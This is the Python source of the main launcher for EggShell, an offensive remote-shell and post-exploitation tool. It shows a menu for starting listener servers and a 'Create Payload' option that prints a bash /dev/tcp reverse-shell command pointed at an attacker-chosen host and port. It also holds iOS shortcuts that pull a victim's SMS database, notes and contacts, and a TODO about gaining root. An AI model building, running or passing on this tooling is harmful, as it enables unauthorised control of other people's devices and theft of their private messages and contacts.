#!/usr/bin/python
#EggShell
#Created By lucas.py 8-18-16
#TODO: Gain root, and fix for any system() call locally
debug = 0

import base64
import binascii
import os
import random
import string
import sys
import time
from StringIO import StringIO
from threading import Thread
from src.encryption.ESEncryptor import ESEncryptor
from src.server.server import ESServer
from src.helper.helper import Helper

#MARK: Globals
iswin = sys.platform.startswith('win')
GREEN = '' if iswin else '\033[1;92m'
RED = '' if iswin else '\033[1;91m'
WHITE = '' if iswin else '\033[0;97m'
ENDC = '' if iswin else '\033[0m'
UNDERLINE_GREEN = '' if iswin else '\033[4;92m'
WHITEBU = '' if iswin else '\033[1;4m'
COLOR_INFO = '' if iswin else '\033[0;36m'
NES = ('' if iswin else '\033[4;32m')+"NES"+WHITE+"> "

#MARK: Globals
h = Helper()
shellKey = ''.join((random.choice(string.letters+string.digits)) for x in range(32))
terminator = ''.join((random.choice(string.letters)) for x in range(16))
server = ESServer(ESEncryptor(shellKey,16),terminator,h)

BANNER_ART_TEXT = GREEN+"""
.---.          .-. .        . .       \\      `.
|             (   )|        | |     o  \\       `.
|--- .-.. .-.. `-. |--. .-. | |         \\        `.
|   (   |(   |(   )|  |(.-' | |     o    \\      .`
'---'`-`| `-`| `-' '  `-`--'`-`-          \\   .`
     ._.' ._.'                               `          """+RED+"""
 _._._._._._._._._._|"""+COLOR_INFO+"______________________________________________."+RED+"""
|_#_#_#_#_#_#_#_#_#_|"""+COLOR_INFO+"_____________________________________________/"+RED+"""
                    l
"""+WHITE+"\nVersion: 2.0.9.5\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
    1): Start Server
    2): Start Multi Session
    3): Create Payload
    4): Exit
""" + WHITE + "-"*40
BANNER = BANNER_ART_TEXT + "" + BANNER_MENU_TEXT + "\n" + NES

CMD_CLEAR = 'cls' if iswin else 'clear'

iosshortcuts = {
    "getsms":"download /var/mobile/Library/SMS/sms.db",
    "getnotes":"download /var/mobile/Library/Notes/notes.sqlite",
    "getcontacts":"download /var/mobile/Library/AddressBook/AddressBook.sqlitedb"
}

def interactiveMenu():
    while 1:
        os.system(CMD_CLEAR)
        option = raw_input(BANNER)
        choose = {
            "1" : menuStartServer,
            "2" : menuStartMultiServer,
            "3" : menuCreateScript,
            "4" : menuExit
        }
        try:
            choose[option]()
            os.system(CMD_CLEAR)
        except KeyError:
            continue

def promptHostPort():
    lhost = server.getip()
    lport = 4444
    hostChoice = raw_input("SET LHOST (Leave blank for "+lhost+")>")
    if hostChoice != "":
        lhost = hostChoice
    h.strinfo("LHOST = " + lhost)
    portChoice = raw_input("SET LPORT (Leave blank for "+str(lport)+")>")
    if portChoice != "":
        lport = portChoice
    h.strinfo("LPORT = " + str(lport))
    return [lhost,lport]

def promptServerRun(host,port):
    if raw_input(NES+"Start Server? (Y/n): ") == "n":
        return
    else:
        if raw_input(NES+"Multi Server? (y/N): ") == "y":
            server.multiServer(host,port)
        else:
            server.singleServer(host,port)

#MARK: Menu Functions

def menuStartServer(): #1
    sp = promptHostPort()
    server.singleServer(sp[0],sp[1])

def menuStartMultiServer(): #2
    sp = promptHostPort()
    server.multiServer(sp[0],sp[1]);
    interactiveMenu()

def menuCreateScript(): #3
    sp = promptHostPort()
    print COLOR_INFO+"bash &> /dev/tcp/"+sp[0]+"/"+str(sp[1])+" 0>&1"+ENDC
    promptServerRun(sp[0],sp[1])

def menuExit(): #4
    exit()

def main():
    #main menu options
    try:
        interactiveMenu()
    except (KeyboardInterrupt, EOFError) as e:
        pass

main()
